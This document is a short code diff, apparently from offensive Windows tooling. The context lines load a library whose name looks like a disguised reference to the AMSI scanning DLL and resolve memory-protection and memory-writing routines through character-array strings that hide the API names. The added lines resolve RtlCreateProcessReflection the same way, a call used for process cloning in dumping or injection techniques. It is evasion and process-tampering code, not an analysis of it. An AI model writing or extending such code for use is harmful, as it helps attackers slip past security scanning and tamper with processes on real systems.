@@ -17,6 +17,9 @@ HMODULE  am51dll = LoadLibrary(am51);
 char protect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
 myNtProtectVirtualMemory pVirtualProtect = (myNtProtectVirtualMemory)hlpGetProcAddress(dllModule, protect);
 
+char rtl[] = { 'R','t','l','C','r','e','a','t','e','P','r','o','c','e','s','s','R','e','f','l','e','c','t','i','o','n',0 };
+RtlCreateProcessReflectionFunc pRtlCreateProcessReflection = (RtlCreateProcessReflectionFunc)hlpGetProcAddress(dllModule, rtl);
+
 char write[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
 myNtWriteVirtualMemory pWriteMem = (myNtWriteVirtualMemory)hlpGetProcAddress(dllModule, write);
 
